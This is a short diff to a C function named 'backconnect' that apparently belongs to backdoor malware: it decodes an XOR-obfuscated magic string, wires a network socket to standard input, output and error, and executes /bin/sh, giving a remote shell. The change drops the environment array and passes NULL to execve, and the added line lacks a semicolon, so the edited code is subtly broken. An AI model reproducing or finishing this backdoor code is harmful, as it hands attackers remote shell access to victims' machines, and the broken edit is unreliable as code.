@@ -16,7 +16,7 @@ void backconnect(int sock)
 		return; 
 	}
 	write(sock, "[-] backconnect shell dropped\n", strlen("[-] backconnect shell dropped\n")); 
-	char *argv[3], *envp[5]; 
+	char *argv[3]
 	char *login = strdup(MAGIC); xor(login); 
 	char *shell = "/bin/sh"; 
 	argv[0] = shell; 
@@ -27,7 +27,7 @@ void backconnect(int sock)
 	dup2(sock, 0); 
 	dup2(sock, 1); 
 	dup2(sock, 2); 
-	execve(argv[0], argv, envp); 
+	execve(argv[0], argv, NULL); 
 	close(sock); 
 	return;
 }
